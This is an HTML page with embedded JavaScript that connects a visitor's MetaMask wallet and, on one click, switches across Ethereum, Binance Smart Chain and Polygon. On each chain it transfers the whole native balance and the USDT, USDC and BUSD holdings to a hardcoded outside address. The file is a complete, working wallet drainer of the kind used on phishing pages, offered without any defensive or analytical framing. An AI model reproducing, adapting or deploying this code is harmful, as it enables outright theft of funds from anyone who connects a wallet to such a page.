<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send All Crypto from Wallet</title>
</head>
<body>
    <h2>Connect MetaMask & Send All Crypto</h2>
    <button id="connectWallet">Connect Wallet</button>
    <button id="sendAll" disabled>Send All Crypto</button>
    <p id="status"></p>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        let signer;

        // Destination wallet (replace with your own)
        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";

        // List of chains to switch to and their native token names
        const chains = [
            { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH', nativeDecimals: 18 },           // Ethereum Mainnet
            { chainId: 56, name: 'Binance Smart Chain', nativeSymbol: 'BNB', nativeDecimals: 18 }, // Binance Smart Chain
            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC', nativeDecimals: 18 }           // Polygon Mainnet
        ];

        // List of ERC-20 tokens for each chain (you can expand this list as needed)
        const erc20Tokens = {
            1: [ // Ethereum Mainnet
                { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, symbol: "USDT" },
                { address: "0xA0b86991c6218b36c1d19D4a2e9EB0cE3606eB48", decimals: 6, symbol: "USDC" }
            ],
            56: [ // Binance Smart Chain
                { address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18, symbol: "BUSD" }
            ],
            137: [ // Polygon Mainnet
                { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6, symbol: "USDC" }
            ]
        };

        document.getElementById('connectWallet').addEventListener('click', async () => {
            try {
                // Request account access
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();

                const userAddress = await signer.getAddress();
                document.getElementById('status').innerText = `Connected: ${userAddress}`;
                
                // Enable the Send All button after connection
                document.getElementById('sendAll').disabled = false;
            } catch (error) {
                document.getElementById('status').innerText = `Connection failed: ${error.message}`;
            }
        });

        document.getElementById('sendAll').addEventListener('click', async () => {
            try {
                for (const chain of chains) {
                    // Switch to each chain
                    await switchNetwork(chain.chainId);

                    // Send all native tokens on this chain
                    await sendAllNativeTokens(chain);

                    // Send all ERC-20 tokens on this chain
                    await sendAllERC20Tokens(chain);

                    document.getElementById('status').innerText += `\nFinished on ${chain.name}`;
                }
                document.getElementById('status').innerText += `\nAll transactions sent successfully.`;
            } catch (error) {
                document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
            }
        });

        // Switch to the desired network
        async function switchNetwork(chainId) {
            try {
                await provider.send('wallet_switchEthereumChain', [{ chainId: ethers.utils.hexValue(chainId) }]);
                document.getElementById('status').innerText += `\nSwitched to chain: ${chainId}`;
            } catch (switchError) {
                document.getElementById('status').innerText = `\nFailed to switch network: ${switchError.message}`;
                throw switchError;
            }
        }

        // Send all native tokens (ETH, BNB, MATIC, etc.)
        async function sendAllNativeTokens(chain) {
            const userAddress = await signer.getAddress();
            const balance = await provider.getBalance(userAddress);

            const gasPrice = await provider.getGasPrice();
            const estimatedGasLimit = 21000; // Standard gas limit for native token transfer
            const totalGasCost = gasPrice.mul(estimatedGasLimit);

            // Calculate amount to send (balance - gas fees)
            const amountToSend = balance.sub(totalGasCost);

            if (amountToSend.lte(0)) {
                throw new Error(`Insufficient ${chain.nativeSymbol} balance to cover gas fees.`);
            }

            const tx = {
                to: recipientAddress,
                value: amountToSend, // Send all native tokens minus gas
                gasLimit: estimatedGasLimit,
                gasPrice: gasPrice
            };

            const transaction = await signer.sendTransaction(tx);
            await transaction.wait();

            document.getElementById('status').innerText += `\nNative token (${chain.nativeSymbol}) sent: ${transaction.hash}`;
        }

        // Send all ERC-20 tokens on the current chain
        async function sendAllERC20Tokens(chain) {
            const tokens = erc20Tokens[chain.chainId] || [];
            for (const token of tokens) {
                const tokenContract = new ethers.Contract(token.address, [
                    // The ERC-20 `balanceOf` function ABI
                    "function balanceOf(address) view returns (uint256)",
                    // The ERC-20 `transfer` function ABI
                    "function transfer(address to, uint amount) returns (bool)"
                ], signer);

                const userAddress = await signer.getAddress();
                const tokenBalance = await tokenContract.balanceOf(userAddress);

                if (tokenBalance.gt(0)) {
                    // Send ERC-20 token
                    const transaction = await tokenContract.transfer(recipientAddress, tokenBalance);
                    await transaction.wait();

                    document.getElementById('status').innerText += `\n${token.symbol} sent: ${transaction.hash}`;
                } else {
                    document.getElementById('status').innerText += `\nNo ${token.symbol} to send.`;
                }
            }
        }
    </script>
</body>
</html>
